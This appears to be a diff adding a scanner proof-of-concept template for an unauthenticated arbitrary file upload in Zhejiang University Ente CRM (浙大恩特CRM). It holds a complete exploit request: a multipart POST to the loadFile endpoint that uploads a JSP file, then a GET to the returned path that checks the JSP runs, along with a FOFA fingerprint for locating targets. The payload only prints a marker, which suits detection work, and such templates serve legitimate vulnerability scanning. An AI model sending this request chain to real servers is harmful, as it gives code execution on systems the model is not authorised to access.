@@ -1,0 +1,34 @@
+id: poc-yaml-zhe-da-en-te-crm-anyfile-upload
+info:
+  name: 浙大恩特CRM 全版本前台任意文件上传
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 浙大恩特CRM
+  fofa: EnterCRM
+variables:
+  t1: random_str(8)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /entsoft/CustomerAction.entphone;.js?method=loadFile
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
+  data: '------WebKitFormBoundarye8FPHsIAq9JN8j2A
+
+    Content-Disposition: form-data; name="file";filename="{{.t1}}.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <%out.print("{{.t2}}");%>
+
+    ------WebKitFormBoundarye8FPHsIAq9JN8j2A--'
+  expression: status_code == 200 && contains(body,t1)
+  output:
+  - regex_match(body,"\"filepath\":\"(?P<jsp>.*?)\"")
+- method: GET
+  path: /{{.jsp}}
+  expression: status_code == 200 && contains(body,t2) && !contains(body,"<")
+transport: http
